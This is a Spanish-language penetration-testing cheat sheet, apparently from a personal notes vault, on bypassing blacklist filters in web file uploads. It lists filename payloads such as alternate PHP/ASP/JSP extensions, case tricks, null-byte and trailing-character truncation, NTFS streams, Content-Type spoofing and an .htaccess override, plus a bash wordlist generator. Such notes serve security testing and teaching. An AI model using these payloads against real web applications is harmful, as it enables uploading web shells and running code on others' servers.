---
aliases:
tags:
  - vuln/file-upload
  - technique/execution
  - asset/web-app
kind: SubCheatSheet
linked:
  - "[[File Upload - Vulnerabilidades]]"
---
# File Upload - Bypass de Filtros de Lista Negra

---

## Cheatsheet

| **Filename payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `shell.phtml` / `.phar` / `.php3` / `.php4` / `.php5` / `.php7` / `.pht` / `.inc` | Ext PHP alternativa que Apache aún ejecuta | Blacklist solo bloquea `.php`. |
| `shell.aspx` / `.asp` / `.cer` / `.asa` / `.ashx` | Ext ASP/IIS alternativas | Backend IIS, blacklist incompleta. |
| `shell.jsp` / `.jspx` / `.jws` | Ext Java alternativas | Backend Tomcat/Jetty. |
| `shell.PhP` / `shell.PHP` / `shell.pHp` | Case bypass | Filtro case-sensitive (regex `/\.php$/`). |
| `shell.php ` (espacio trailing) | Windows API trim → `shell.php` | Backend Windows. |
| `shell.php.` (punto trailing) | Windows trim → `shell.php` | Backend Windows. |
| `shell.php.jpg` | Apache `AddHandler` ejecuta por primera ext conocida | Apache con `AddHandler php5-script .php`. |
| `shell.jpg.php` | Filtro mira primera ext, OS usa última | Filtro mal formado. |
| `shell.php%00.jpg` | Null byte trunca string en C-based parsers | PHP <5.3, Java legacy. |
| `shell.php%0a.jpg` / `shell.php%0d%0a.jpg` | Newline trunca en algunos parsers | Edge case. |
| `shell.php:.jpg` | NTFS Alternate Data Stream — guarda `shell.php` | Backend Windows + IIS. |
| `shell.php/.` / `shell.php/x.jpg` | Path tricks que algunos servers normalizan | Apache mod_rewrite laxo. |
| `shell.php` con `Content-Type: image/jpeg` en multipart | Backend confía en header HTTP | Validación solo de content-type. |
| Subir `.htaccess` con `AddType application/x-httpd-php .txt`, después `shell.txt` | Override de config → `.txt` ejecuta PHP | Apache con `AllowOverride All`. |
^fu-blacklist

### Wordlist generator

```bash
# Generar lista combinada para fuzz masivo
for char in '' '%20' '%00' '%0a' '%0d%0a' '.' ' '; do
  for ext in 'php' 'phps' 'phar' 'phtml' 'pht' 'php3' 'php4' 'php5' 'php7' 'inc'; do
    echo "shell.$ext$char"
    echo "shell.$ext$char.jpg"
    echo "shell.jpg.$ext$char"
    echo "shell.jpg.$ext"
  done
done > fileupload-wordlist.txt
wc -l fileupload-wordlist.txt
```

### Ext alternativas por stack

| Stack | Extensions ejecutables |
|:---:|:---:|
| PHP/Apache | `.php`, `.php3`, `.php4`, `.php5`, `.php7`, `.phps`, `.phtml`, `.phar`, `.pht`, `.inc` |
| PHP/Nginx | Mismo que Apache + abuse de `.user.ini` |
| ASP/IIS | `.asp`, `.aspx`, `.cer`, `.asa`, `.ashx`, `.asmx`, `.config` |
| Java/Tomcat | `.jsp`, `.jspx`, `.jspf`, `.jws`, `.war` |
| Perl | `.pl`, `.cgi`, `.pm` |
| Ruby/Rack | `.rb`, `.rhtml` |
| Python/CGI | `.py`, `.cgi` |
^fu-blacklist-ext

---

## Overview

Blacklist = filtro bloquea lista de extensiones peligrosas conocidas. Bypass = encontrar ext NO listada que aún ejecute.

**Estrategias clave:**
1. **Ext alternativas** — `.phar`/`.phtml`/`.pht` para PHP, `.aspx`/`.cer` para ASP.
2. **Case bypass** — `.PhP` cuando filtro es case-sensitive.
3. **OS quirks** — espacio/punto trailing en Windows, null byte en PHP <5.3.
4. **Doble ext** — orden depende del parser (Apache `AddHandler` ejecuta `.php.jpg` como PHP).
5. **`.htaccess` upload** — si Apache + `AllowOverride`, atacante define qué ejecuta.

Combinar con [[File Upload - Bypass de Contenido]] para sortear magic byte checks.

---
